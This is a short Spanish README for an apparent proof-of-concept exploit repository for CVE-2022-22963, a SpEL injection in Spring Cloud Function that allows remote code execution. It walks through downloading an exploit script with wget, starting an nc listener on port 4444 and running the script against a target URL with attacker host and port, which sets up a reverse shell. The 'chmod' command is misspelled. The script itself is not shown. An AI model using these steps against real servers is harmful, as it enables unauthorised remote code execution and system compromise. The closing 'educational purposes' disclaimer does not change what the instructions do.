# CVE-2022-22963
En las versiones 3.1.6, 3.2.2 y versiones anteriores de Spring Cloud Function, al utilizar la funcionalidad de enrutamiento es posible que un usuario proporcione un SpEL especialmente diseñado como una expresión de enrutamiento que puede resultar en la ejecución remota de código y el acceso a recursos locales.
## PoC
Descarga el archivo springCloud.sh
```bash
wget https://raw.githubusercontent.com/jrbH4CK/CVE-2022-22963/main/springCloud.sh
```
Cambia los permisos de ejecución
```bash
chmode +x springCloud.sh
```
Inicia nc por el puerto deseado
```bash
nc -nlvp 4444
```

Ejecuta el comando siguiente cambiando los parametros de acuerdo a tus necesidades
```bash
./springCloud.sh url lhost lport
```

NOTA: El uso de este repositorio es responsabilidad de quien lo utiliza y no del autor, solo con fines educativos.
